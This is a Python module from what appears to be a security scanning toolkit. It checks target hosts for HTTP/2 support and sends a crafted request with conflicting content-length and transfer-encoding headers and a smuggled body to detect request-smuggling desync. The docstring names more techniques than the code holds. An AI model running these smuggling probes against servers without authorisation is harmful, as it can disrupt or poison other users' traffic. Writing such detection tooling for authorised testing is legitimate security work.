"""
modules/http2_smuggling.py
--------------------------
HTTP/2 request smuggling detection.
Techniques: H2.CL, H2.TE, H2C upgrade, pseudo-header abuse.
Graceful: requires 'h2' python package for direct H2 tests.
"""

import socket
import ssl
from typing import List, Dict, Optional
from urllib.parse import urlparse

from core.logger import get_logger, info, ok, warn, skip
from core.utils import safe_request, write_lines
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("http2_smuggling")


def _has_h2() -> bool:
    try:
        import h2  # noqa
        return True
    except ImportError:
        return False


def check_h2_support(url: str) -> Optional[Dict]:
    """Check if server supports HTTP/2."""
    p = urlparse(url)
    host = p.netloc.split(":")[0]
    port = int(p.port or (443 if p.scheme == "https" else 80))

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        with socket.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                proto = ssock.selected_alpn_protocol()
                if proto == "h2":
                    return {"host": host, "port": port, "alpn": proto}
    except Exception as e:
        log.debug(f"h2 check failed {url}: {e}")
    return None


def test_h2_cl_smuggling(host: str, port: int) -> Optional[Dict]:
    """
    Test H2.CL smuggling: send HTTP/2 request with mismatched content-length.
    """
    if not _has_h2():
        return None
    try:
        import h2.connection
        import h2.config
        import h2.events
    except ImportError:
        return None

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])

        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                ssock.sendall(conn.data_to_send())

                # Malicious headers: content-length mismatch
                headers = [
                    (":method", "POST"),
                    (":path", "/"),
                    (":scheme", "https"),
                    (":authority", host),
                    ("content-length", "6"),
                    ("transfer-encoding", "chunked"),
                ]
                conn.send_headers(1, headers, end_stream=False)
                # Send body "0\r\n\r\nG" (chunked smuggling)
                conn.send_data(1, b"0\r\n\r\nG", end_stream=True)
                ssock.sendall(conn.data_to_send())

                # Read response
                ssock.settimeout(5)
                try:
                    data = ssock.recv(65535)
                    # If we get 400/500, server may be rejecting; if timeout, potential smuggling
                    if not data:
                        return {
                            "type": "http2_cl_smuggling_potential",
                            "url": f"https://{host}:{port}/",
                            "evidence": "Connection closed without response — possible desync",
                            "severity": "high",
                            "confidence": 30,
                        }
                except socket.timeout:
                    return {
                        "type": "http2_cl_smuggling_potential",
                        "url": f"https://{host}:{port}/",
                        "evidence": "Timeout — possible desync/hang",
                        "severity": "medium",
                        "confidence": 25,
                    }
    except Exception as e:
        log.debug(f"h2 smuggling test failed: {e}")
    return None


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "http2_smuggling", output_root)
    urls = load_urls(domain, output_root)
    https_urls = [u for u in urls if u.startswith("https://")]
    if not https_urls:
        info("No HTTPS URLs to test")
        return {"count": 0, "findings": []}

    info("Checking HTTP/2 support + smuggling indicators")
    findings: List[Dict] = []
    h2_hosts: List[str] = []

    hosts = sorted({urlparse(u).netloc.split(":")[0] for u in https_urls})
    for host in hosts[:20]:
        try:
            support = check_h2_support(f"https://{host}")
            if not support:
                continue
            h2_hosts.append(host)
            res = test_h2_cl_smuggling(host, 443)
            if res:
                findings.append(res)
                save_finding(domain, "http2_smuggling", res["type"],
                             res["severity"], res["url"],
                             evidence=res["evidence"], confidence=res["confidence"],
                             scan_id=scan_id, output_root=output_root)
        except Exception as e:
            log.debug(f"h2 test failed {host}: {e}")

    if h2_hosts:
        write_lines(mdir / "h2_hosts.txt", h2_hosts)

    if findings:
        write_lines(mdir / "http2_smuggling_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']}" for f in findings])

    return {"count": len(findings), "findings": findings, "h2_hosts": h2_hosts}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "http2_smuggling", run, args.output)
